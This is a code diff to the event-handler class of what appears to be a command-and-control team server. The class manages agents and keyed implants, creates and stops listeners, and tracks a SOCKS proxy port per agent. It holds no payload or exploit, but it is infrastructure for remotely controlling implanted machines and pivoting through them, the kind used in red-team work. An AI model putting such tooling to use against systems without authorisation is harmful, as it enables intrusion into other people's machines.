@@ -10,16 +10,16 @@ from connect.listener import listener_manager
 
 class TeamServerEvents:
 
-    def __init__(self, app, key, sio_server):
+    def __init__(self, app, key, sio_server, socks_manager):
         self.app = app
         self.key = key
         self.sio_server = sio_server
+        self.socks_manager = socks_manager
         self.sio_server.on('agent', self.agent)
         self.sio_server.on('connect', self.connect)
         self.sio_server.on('implant', self.implant)
         self.sio_server.on('task', self.task)
         self.sio_server.on('listener', self.listener)
-        self.sio_server.on('proxy', self.proxy)
 
     async def connect(self, sid, environ, auth: str = 'no key provided'):
         if auth != self.key:
@@ -36,8 +36,7 @@ class TeamServerEvents:
             try:
                 deserialized_json = json.loads(args[1])
             except json.JSONDecodeError:
-                await self.sio_server.emit('error',
-                                           f'Invalid JSON provided to {handler_function.__name__} event: {args[0]}')
+                await self.sio_server.emit('error', f'Invalid JSON provided to {handler_function.__name__} event: {args[0]}')
                 return
 
             await handler_function(self, deserialized_json)
@@ -52,8 +51,15 @@ class TeamServerEvents:
                 seconds = int(list_agent.get('seconds'))
                 agents = [agent.get_agent() for agent in session.query(AgentModel).all() if
                           0 <= agent.get_delta_seconds() <= seconds]
+                for agent in agents:
+                    agent['socks'] = '•' * 4
+                    try:
+                        socks_server = self.socks_manager.socks_servers[agent['id']]
+                        agent['socks'] = f'{socks_server.port}'
+                    except KeyError:
+                        continue
                 if not agents:
-                    await self.sio_server.emit('information', 'There are no agents.')
+                    await self.sio_server.emit('information', 'There are no agents')
                     return
                 await self.sio_server.emit('agents', agents)
                 return
@@ -69,14 +75,14 @@ class TeamServerEvents:
             if create_implant:
                 new_implant = ImplantModel()
                 session.add(new_implant)
-                await self.sio_server.emit('success',
-                                           f'Implant `{new_implant.id}` created their key is: `{new_implant.key}`')
+                session.commit()
+                await self.sio_server.emit('success', f'Implant {new_implant.id} created their key is: {new_implant.key}')
                 return
 
             if list_implant:
                 implants = [implant.get_implant() for implant in session.query(ImplantModel).all()]
                 if not implants:
-                    await self.sio_server.emit('information', 'There are no implants.')
+                    await self.sio_server.emit('information', 'There are no implants')
                     return
                 await self.sio_server.emit('implants', implants)
                 return
@@ -116,7 +122,7 @@ class TeamServerEvents:
         if not module:
             return True
         if not os.path.exists(module):
-            self.sio_server.emit('error', f'Module {module} does not exist.')
+            await self.sio_server.emit('error', f'Module {module} does not exist.')
             return False
         module_bytes = open(module, 'rb').read()
         module_md5 = hashlib.md5(module_bytes).hexdigest()
@@ -135,10 +141,15 @@ class TeamServerEvents:
     @json_event_handler
     async def listener(self, data):
         create_listener = data.get('create', None)
+        stop_listener = data.get('stop', None)
         list_listener = 'list' in data.keys()
 
         if create_listener:
-            listener_manager.create_listener(self.app, self.key, create_listener['ip'], create_listener['port'])
+            await listener_manager.create_listener(create_listener['ip'], create_listener['port'], self.socks_manager, self.sio_server)
+            return
+
+        if stop_listener:
+            await listener_manager.stop_listener(stop_listener['ip'], stop_listener['port'], self.sio_server)
             return
 
         if list_listener:
@@ -150,7 +161,3 @@ class TeamServerEvents:
             return
 
         await self.sio_server.emit('information', f'Listener event hit with the following data: {data}')
-
-    @json_event_handler
-    async def proxy(self, data):
-        await self.sio_server.emit(*data)
